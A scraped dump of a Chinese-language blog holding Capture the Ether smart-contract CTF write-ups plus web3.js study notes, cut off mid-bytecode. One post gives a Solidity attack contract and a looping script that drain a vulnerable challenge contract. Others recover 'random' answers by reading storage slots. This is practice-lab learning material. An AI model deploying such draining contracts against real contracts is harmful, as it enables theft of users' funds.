hash","date":"2023-04-10T06:01:10.000Z","updated":"2023-04-10T06:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the block hash/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20block%20hash/","excerpt":"","text":"Predict the block hash1. 题目 1.1 题目： Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123; address guesser; bytes32 guess; uint256 settlementBlockNumber; function PredictTheBlockHashChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(bytes32 hash) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = hash; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); bytes32 answer = block.blockhash(settlementBlockNumber); guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，该题和上一题差不多，这题要猜测的数是 256位的，即byte32类型 2.2 这题是需要预测下一个块哈希的块号，显然是不可能的，但是 官方文档对 block.blockhash 是这样定义和解释的 具体是什么意思呢，我去网上搜的解释是，他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零—-我的理解是：如果题目中的 answer 是在 block.number &#x3D; 0 时设置的，当此时的block.number &gt;&#x3D; 256时，再去计算 block.blockhash(settlementBlockNumber) 这个值就是 block.blockhash(0) 的值了（settlementBlockNumber &#x3D; block.number + 1） 2.3 解题思路就是，当我们调用 lockInGuess() 函数，以 0 的hash 作为参数传入该函数中，过一段时间后，再调用 settle() 函数，具体等多久我也不知道 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Predict the future","slug":"Smart contracts/capther the ether/Predict the future","date":"2023-04-10T04:01:10.000Z","updated":"2023-04-10T04:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the future/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20future/","excerpt":"","text":"Predict the future1. 题目 1.1 This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers. Note that it is indeed possible to solve this challenge without losing any ether. 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123; address guesser; uint8 guess; uint256 settlementBlockNumber; function PredictTheFutureChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 该题需要提前锁定答案，再验证答案（即，先调用 lockInGuess 函数再调用 settle 函数）；很显然这样是猜不出来的，但是由 uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; 可知，answer 的值只用十个可能，即 [0,9] 2.2 我们可以先确定我们自己设定的 answer ，改变题目要求中的 answer ，通过不断改变 block.number 和 时间戳来改变题目中的 answer （调用其他合约时，是在同一块区块中进行的，也就是为我们确定唯一的 block.number 和 时间戳） 2.3 编写一个攻击合约， 123456789101112131415161718192021222324contract attack&#123; PredictTheFutureChallenge pre; uint8 public answer=5; function attack(address _addr)public&#123; pre = PredictTheFutureChallenge(_addr); &#125; function lock()public payable&#123; pre.lockInGuess.value(1 ether)(answer); &#125; function att()public&#123; uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; if(temp == answer)&#123; pre.settle(); &#125; require(pre.isComplete())&#123; tx.orgin.transfer(address(this).balance); &#125; &#125; function()external payable&#123; &#125;&#125; 2.4 先锁定我们的答案（调用lock() 函数），不停的调用att() 函数，直到 PredictTheFutureChallenge 合约中的 isComplete 函数的值返回的是 true 或 合约的余额为 0 3. 解题 3.1 使用 Web3解题（因为remix的bug实在是太多了），先在 remix部署合约，获取相对应的合约地址 tips：部署一个 attack 合约之后，如果执行了lock 函数就不能在不重新部署 PredictTheFutureChallenge合约的基础上使用新合约调用lock函数，因为guesser已经被赋值了，稍后的require 将不能通过 3.2 在我的 vscode上面疯狂执行 att 函数，直到remix上 isComplete返回的值发生改变，合约的金额转移为止，如图： 3.3 在 vscode 上的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var contractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\靶场\\\\capturetheether\\\\abi\\\\PredictTheFutureChallengeHack.abi&quot;),toString());// var contractADD = &quot;0x80F5D36E412076Dd758961d729D8F84dc6c34A46&quot;;var contractADD = &quot;0xD52d9e548C6d18445a465dd08b5b2B47ca449Ee9&quot;; // Hack_Addressvar contract = new web.eth.Contract(contractABI,contractADD);// console.log(contract);var balance = web.eth.getBalance(contractADD,function(err,result)&#123;console.log(result);&#125;);// console.log(balance);// 00000000000000000000000580f5d36e412076dd758961d729d8f84dc6c34a46var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; // answer = web.utils.hexToNumber(result); console.log(&quot;这个是结果：&quot; + result);&#125;)// contract.methods.lock().send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// value: 1000000000000000000// &#125;).on(&quot;receipt&quot;,function(result)&#123;// console.log(result);// &#125;)contract.methods.att().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, // value: 1000000000000000000&#125;).on(&quot;receipt&quot;,function(result)&#123; console.log(result);&#125;)","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the new number","slug":"Smart contracts/capther the ether/Guess the new number","date":"2023-04-07T01:47:10.000Z","updated":"2023-04-07T01:47:10.000Z","comments":true,"path":"2023/04/07/Smart contracts/capther the ether/Guess the new number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/07/Smart%20contracts/capther%20the%20ether/Guess%20the%20new%20number/","excerpt":"","text":"Guess the new number1. 题目 1.1 要求： The number is now generated on-demand when a guess is made 1.2 题目代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123; function GuessTheNewNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 分析代码可知，answer是在执行 guess 函数的之后才会被赋值，也就是说不能直接通过 web3 和合约交互获取 answer ，但是我们知道同一块区块中的时间戳是同一个，也就是说让 guess 函数和自己的答案在同一个合约中 2.1 什么意思呢，简单来说就是 answer 的定义为： uint8 answer = uint8(uint256(keccak256(block.blockhash(block.number - 1), now))); (其中 now 就是旧版本的时间戳，现在获取时间戳的方法是：block.timestamp ) 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the random number","slug":"Smart contracts/capther the ether/Guess the random number","date":"2023-04-05T04:59:10.000Z","updated":"2023-04-05T04:59:10.000Z","comments":true,"path":"2023/04/05/Smart contracts/capther the ether/Guess the random number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/05/Smart%20contracts/capther%20the%20ether/Guess%20the%20random%20number/","excerpt":"","text":"Guess the random number1. 题目 1.1 This time the number is generated based on a couple fairly random sources 1.2 题目代码： 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123; uint8 answer; function GuessTheRandomNumberChallenge() public payable &#123; require(msg.value == 1 ether); answer = uint8(keccak256(block.blockhash(block.number - 1), now)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 题目代码中的 answer 是随机生成的，及根据创建的时候区块号和当时的时间 now 来打的时间戳。 2.2 区块链链上的所有内容都是公开的，我们可以利用与合约交互，获取到合约上存储的值 2.3 又因为合约中只有一个变量，及索引为 0 位置的值，便是我的答案answer 1var contract = new web.eth.Contract(contract_abi,contract_add); tips: 为了弄懂这个存储位置，我还特意去阅读相关文献了解了EVM的存储位置和原理，相关文章在这 ： storage-slot存储拓展 3. 解题 3.1 用 js代码 实现 web3 与合约的交互 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// console.log(web.currentProvider);// remix 上部署的合约地址var contract_add = &quot;0x4DB61fCf9a56da7575e38f68BAf8E1621513001a&quot;;// 在remix 上获取的 ABIvar contract_abi = [ &#123; &quot;constant&quot;: false, &quot;inputs&quot;: [ &#123; &quot;name&quot;: &quot;n&quot;, &quot;type&quot;: &quot;uint8&quot; &#125; ], &quot;name&quot;: &quot;guess&quot;, &quot;outputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;payable&quot;: true, &quot;stateMutability&quot;: &quot;payable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;constant&quot;: true, &quot;inputs&quot;: [], &quot;name&quot;: &quot;isComplete&quot;, &quot;outputs&quot;: [ &#123; &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bool&quot; &#125; ], &quot;payable&quot;: false, &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 创建合约实例var contract = new web.eth.Contract(contract_abi,contract_add);// console.log(contract);web.eth.getStorageAt(contract_add,0,(error,result) =&gt; &#123; // 将结果的 16 进制数转化为 10进制 var answer = web.utils.hexToNumber(result); //输出结果 console.log(&quot;存储为：&quot;,answer)&#125;) 3.2 在控制台获取 合约 的 answer 3.3 在 remix 中验证 3.4 结果正确","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"capther the ether总结","slug":"Smart contracts/capther the ether/capther the ether总结","date":"2023-04-03T02:39:10.000Z","updated":"2023-04-03T02:39:10.000Z","comments":true,"path":"2023/04/03/Smart contracts/capther the ether/capther the ether总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/03/Smart%20contracts/capther%20the%20ether/capther%20the%20ether%E6%80%BB%E7%BB%93/","excerpt":"","text":"capther the ether总结1. Guess the secret number 1.1 学会了如何使用暴力破解 2. Guess the random number 2.1 了解了些 EVM的存储的原理，智能合约上全局变量的存贮位置，适当学会了如何取出来 2.2 采用web3 和智能合约交互，获取存储的所需值 12345var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; answer = web.utils.hexToNumber(result); console.log(answer);&#125;) 3. Guess the new number 3.1 知道了合约部署的时候，全局变量会被赋值或者初始化，但是函数体里的则不会被赋值或者初始化，只有当函数被调用的时候才会 3.2 知道了当一个合约调用另一个合约的时候会在同一块区块执行，也就是说 合约之间的调用是在同一个区块当中的 又因为 同一区块中的时间戳是相同的 所以可以推出 可以在攻击合约调用 所需的方法然后原合约中函数的局部变量 answer 根据攻击合约的时间戳生成相对应的 answer 这样一来我们就可以直接将获取到 answer 4. Predict the future5.Predict the block hash6. Token sale7. Token whale8. Mapping 8.1 知道了一个合约能够存储的数据大小为 9.Donation 9.1 探究了一下 memory 和 storage 对 结构体的存储位置的影响 验证猜想的合约： 1234567891011121314151617181920212223242526272829303132contract StorageTest1 &#123; uint256 a; // slot 0 address owner; // slots 1 struct Entry &#123; uint256 id; uint256 value; &#125; Entry c; // slots 2-3&#125;contract StorageTest2 &#123; struct Entry &#123; uint256 id; uint256 value; &#125; uint256 a=10; // slot 0 address owner=&quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;; // slots 1 // 我想知道是不是执行f函数之后slot0 位置的a 和 slot1位置的owner 被 entry.id 和 entry.value的值给覆盖 function f() public payable &#123; Entry entry; entry.id = 20; entry.value = 666; &#125;&#125; 9.2 使用web3进行交互，获取 StorageTest2 合约部署好之后 slot0 和 slot1 存储的值是什么 web3测试猜想 的代码如下： 1234567891011121314151617let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0x52fE4CEafD8e3c717008aC100224e7b4e94BfB8F&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;) 结果是： 9.3 当我在remix上执行f函数后，再查看 slot0 和 slot1的值 可以明显发现原来插槽 0 和 1 位置的值已经被覆盖了 9.4 测试一下结构体和全局声明位置不同会不会影响存储位置 结构体声明在全局变量之后 合约代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; uint256 a = 9; uint256[2] b = [1,2]; struct Entry &#123; uint256 id; address value; &#125; Entry c; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125;&#125; web3交互的代码： 1234567891011121314151617181920212223242526272829let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:8545&quot;));var fs = require(&quot;fs&quot;);var ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\StorageTest2.abi&quot;),toString());var address = &quot;0xEA34F5801A19Db18b9DFE4f5D62F669d673ec605&quot;;var contract = new web.eth.Contract(ABI,address);web.eth.getStorageAt(address,0,(err,slot0)=&gt;&#123; console.log(&quot;The getStorageAt slot0 is =&gt; &quot; + slot0);&#125;)web.eth.getStorageAt(address,1,(err,slot1)=&gt;&#123; console.log(&quot;The getStorageAt slot1 is =&gt; &quot; + slot1);&#125;)web.eth.getStorageAt(address,2,(err,slot2)=&gt;&#123; console.log(&quot;The getStorageAt slot2 is =&gt; &quot; + slot2);&#125;)web.eth.getStorageAt(address,3,(err,slot3)=&gt;&#123; console.log(&quot;The getStorageAt slot3 is =&gt; &quot; + slot3);&#125;)web.eth.getStorageAt(address,4,(err,slot4)=&gt;&#123; console.log(&quot;The getStorageAt slot4 is =&gt; &quot; + slot4);&#125;) 这是测试结果: 结构体声明在全局变量之前： 合约代码： 1234567891011121314151617181920pragma solidity ^0.4.21;contract StorageTest &#123; struct Entry &#123; uint256 id; address value; &#125; Entry c; uint256 a = 9; uint256[2] b = [1,2]; function f() public &#123; Entry c; c.id = 3; c.value = 0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f; &#125; &#125; 测试结果： 结论：在合约定义的全局变量会根据你在合约中声明的先后顺序来分配存储位置（即slot0、slot1）这些，但是在函数体中，如果有结构体类型的申明，且存储类型为默认或为 storage 都会对对原来的存储位置的值进行覆盖 10.Fifty years11.Fuzzy identity12.Public key13.Account Takeover14.Assume ownership15.Token bank","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"capther总结","slug":"capther总结","permalink":"https://biyouqiuqiu.com/tags/capther%E6%80%BB%E7%BB%93/"}]},{"title":"web3_self","slug":"Web3/Basic_Knowledge/web3_self","date":"2023-04-01T02:47:10.000Z","updated":"2023-04-01T02:47:10.000Z","comments":true,"path":"2023/04/01/Web3/Basic_Knowledge/web3_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/01/Web3/Basic_Knowledge/web3_self/","excerpt":"","text":"web3_day01学习资源视频官方文档好文档1. Web3.js 的安装1.1 node.js 的下载安装及配置： 参考博客1.2 在 VSCode 中安装插件 ： code runner 2. 下载安装使用Ganache网上搜一下就有了，建议自己创建一个工作的空间，这样之前操作 的交易信息就会被保留下来。 3. 跟着视频敲代码3.1 视频中的代码：123let Web3 = require(&#x27;web3&#x27;);web3 = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web3); 分析： 解读：第一行中的 require(&#39;web3&#39;) web3是库中的名字，我以为是自定义的，尝试改成其他名字报错如下： 变量名 web3 容易和第一行中的 ‘web3’ 搞混，所以自己换了一个变量名 自己的代码： 123let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));console.log(web); 4. 子模块列表 在执行这段代码的时候，出现了错误 代码： 1234let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));web.eth.getNodeInfo().then(console.log); 解读： 官方文档上的原函数是这样这样写的: web3.eth.getNodeInfo([callback]); 老师的写法是： web.eth.getNodeInfo().then(); 老师说是一样的，.then 的意思是：执行完web.eth.getNodeInfo() 之后，再去执行 .then() 括号里的代码，即 console.log 。 错误： 解决方案： 打开菜单选项，找到之前安装的 Ganache，启动它即可，然后再次运行代码 总结：如果把 Ganache 关闭了，代码又是不能运行的，只有将 Gannache 一直开着的，才可以正常运行，但是 不知那一大串是什么 5. 网络状态查询5.1 查看是否连接到节点 ： web.eth.net.isListening().then(console.log); web.bzz.net.isListening().then(console.log); 5.2 获取 Network ID (网络号) 6. providers相关6.1 查看 Web3 中所有可用的Providers 代码： 123456789&gt;let Web3 = require(&#x27;web3&#x27;);&gt;web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));&gt;// web.eth.getNodeInfo().then(console.log);&gt;// web.eth.net.isListening().then(console.log);&gt;// web.bzz.net.isListening().then(console.log);&gt;console.log(web.providers); 运行结果： 6.2 查看当前设置的 Web3 provider 6.3 查看浏览器环境设置的web3 provider 6.4 设置&#x2F; 修改 provider 7. 批处理请求7.1 将发布合约到测试网 重头戏！！！看到这个界面，我就知道，我又可以学到东西了 原来是是这样连接本地的账户，直接惊呆！ 方法一： ① 打开remix，选择这两个其中之一： ② 将自己本地的端口号填入： ③ 然后就呈现如下界面： ④ 本地账户和remix 中的 账户一一对应： 方法二：嵌入式连接 ① 添加网络 ② 和 remix 建立连接 此时当前网络钱包没钱 ③ 通过私钥导入本地账户 ④ 导入成功之后，就可以在remix 中同步账户余额 ⑤ 可以测试一下，是否能正常使用，结果是 ok 滴 ⑥ 在本地可以查看 remix部署的合约 7.2 复制ABI 和 地址到程序中 ① 复制 remix 中的 ABI ② 到代码程序中，定义一个变量 var abi,并将复制的ABI 作为值，赋给 abi ③ 到remix 中拷贝地址，并赋予 我们自定义的变量 var address 1var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;; ④ 通过 ABI 和 合约地址 去 创建合约对象 1var contract = new web.eth.Contract(abi,address); ⑤ 然后就是是一系列的调用操作（目前代码还不是很懂） 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374let Web3 = require(&#x27;web3&#x27;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getNodeInfo().then(console.log);// web.eth.net.isListening().then(console.log);// web.bzz.net.isListening().then(console.log);// console.log(web.providers);// console.log(web);// console.log(Web3.modules);// console.log(Web3.version);// var web = new Web3(Web3.givenProvider || &quot;ws://localhost:8545&quot;);// console.log(web);var abi = [ &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;_number&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;name&quot;: &quot;setNumber&quot;, &quot;outputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [], &quot;name&quot;: &quot;getNumber&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;uint256&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;uint256&quot; &#125; ], &quot;stateMutability&quot;: &quot;view&quot;, &quot;type&quot;: &quot;function&quot; &#125;];// 部署出来的合约地址var address = &quot;0xA96406CE93aE4803F290dFAb2a54D4e9B050E239&quot;;var contract = new web.eth.Contract(abi,address);function callBack1() &#123; console.log(&quot;callBack1() is running&quot;);&#125;function callBack2() &#123; console.log(&quot;callBack2() is running&quot;);&#125;var batch = new web.BatchRequest();// &quot;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&quot; 是函数调用者的地址batch.add(web.eth.getBalance.request(&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;,&#x27;latest&#x27;,callBack1));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,callBack2));batch.add(contract.methods.getNumber().call.request(&#123;from:&#x27;0x11e6df0756c5D6fCa1ca49b9d6227D49b93C746c&#x27;&#125;,function(error,reusult)&#123; console.log(error); console.log(reusult);&#125;));batch.execute(); 结果： 8. 大数据处理（bigNumber）》》》工具的文档在此处8.1 简介 测试案例： 9. 以太单位转换9.1 web3.utils.fromWei 注意：web3.utils.fromWei(number,[unit])中的 number 通常都是用字符串表示，如果直接是数字的话就会报错 示例： 9.2 web3.utils.toWei 9.3 web3.utils.toHex 演示： tips: 还可以将字符串转换为 16进制 9.4 web3.utils.hexToNumberString 演示示例： 9.5 还有一些其他的转化 10. 地址相关的操作10.1 web3.isAddress ***解读：为什么第五条代码执行的结果为 false？ *** 可以参考我同学的博客：[26.checksum of address | solidity life (levi104.com)](https://www.levi104.com/2023/04/02/03.solidity进阶/26.checksum of address&#x2F;) 11. 查询区块信息11.1 查询最新的区块号(区块高度)–web3.eth.getBlockNumber() 11.2 查询最新区块– we3.eth.getBlock() 11.3 查询区块中的交易 – web3.eth.getTransactionFromBlock() web3_day0212. web3.js 交易操作12.1 账户相关12.1.1 查询账户个数 – web3.eth.getAccount() 12.1.2 查询账户个数 – web3.eth.getAccounts() 12.1.3 查询coinbase – web3.eth.getCoinbase() 12.2 交易相关12.2.1 查询余额 – web3.eth.getBalance() 12.2.2 查询平均 gas 价格 123web3.eth.getGasPrice().then((result) =&gt; &#123; console.log(&quot;wei: &quot; + result);&#125;) 可能是我没学过前端吧，这个写法属实让我震惊。。。。。 12.3 交易执行相关12.3.1 发送交易 – web3.eth.sendTransaction() 突发奇想，试试能不能给我另一个账户转钱 代码： 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), data: &#x27;&#x27;&#125;web.eth.sendTransacation(transactionObject).then(console.log); from (本地账户)： to (钱包地址)： 但是报错了，如下： 再回去看视频，打开弹幕，直接狠狠感谢弹幕老哥！！！！ 正确代码：将 data 字段删掉，或者注释掉 12345678910111213let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// web.eth.getBlock(&quot;latest&quot;,true).then(console.log);var transactionObject = &#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, to: &quot;0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8&quot;, value: web.utils.toWei(&#x27;1&#x27;,&#x27;ether&#x27;), // data: &#x27;&#x27;&#125;web.eth.sendTransaction(transactionObject).then(console.log); 代码正常运行： 到我的钱包去查看余额，发现转账成功： 12.3.2 查询交易信息 — web3.eth.getTransaction() 12.3.3 查询交易收据（进区块数据） – web3.eth.getTransactionReceipt() 13. web3.js 合约交互 — 最想学的地方13.1 应用程序二进制接口(ABI)13.1.1 ABI 简介 13.1.2 ABI 范例 13.1.3 ABI表现形式举例 13.1.4 ABI 的作用 13.2 创建合约13.2.1 准备智能合约 MyContract.sol: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyContract &#123; //状态变量 string storageVaule; //public 的状态变量 string public name; // 构造函数 constructor() public &#123; storageVaule = &quot;biyou&quot;; &#125; // 结构体 struct Student &#123; string name; int age; &#125; // 修改状态变量 function setStorageValue(string memory str) public &#123; storageVaule = str; &#125; function getStorageValue() public view returns(string memory) &#123; return storageVaule; &#125; // 可以发币的函数 function setMoney() public payable &#123; &#125; // 事件 event myEvent (string name); function emitEvent(string memory name) public returns(string memory) &#123; emit myEvent(name); return strConcat(&quot;hello&quot;,name); &#125; function strConcat(string memory _a, string memory _b) internal pure returns(string memory) &#123; bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); string memory ret = new string(_ba.length + _bb.length); bytes memory bret = bytes(ret); uint k = 0; for (uint i = 0; i &lt; _ba.length; i++) bret[k++] = _ba[i]; for (uint i = 0; i &lt; _bb.length; i++) bret[k++] = _bb[i]; return string(ret); &#125;&#125; 13.2.2 直接使用js在区块链上部署一个新的智能合约（！！！难点） 测试代码： 1234567891011121314151617181920212223let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));// fs 模块读取.sol合约文件var fs = require(&quot;fs&quot;);var myContractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\MyContract.abi&quot;),toString());var myContract = new web.eth.Contract(myContractABI);var data = &quot;0x608060405234801561001057600080fd5b506040518060400160405280600581526020017f6269796f750000000000000000000000000000000000000000000000000000008152506000908051906020019061005c929190610062565b50610166565b82805461006e90610105565b90600052602060002090601f01602090048101928261009057600085556100d7565b82601f106100a957805160ff19168380011785556100d7565b828001600101855582156100d7579182015b828111156100d65782518255916020019190600101906100bb565b5b5090506100e491906100e8565b5090565b5b808211156101015760008160009055506001016100e9565b5090565b6000600282049050600182168061011d57607f821691505b6020821081141561013157610130610137565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61095f806101756000396000f3fe60806040526004361061004a5760003560e01c806306fdde031461004f57806344e649b71461007a57806390ad7f5414610084578063982296a8146100af578063ec6070f6146100ec575b600080fd5b34801561005b57600080fd5b50610064610115565b60405161007191906106a9565b60405180910390f35b6100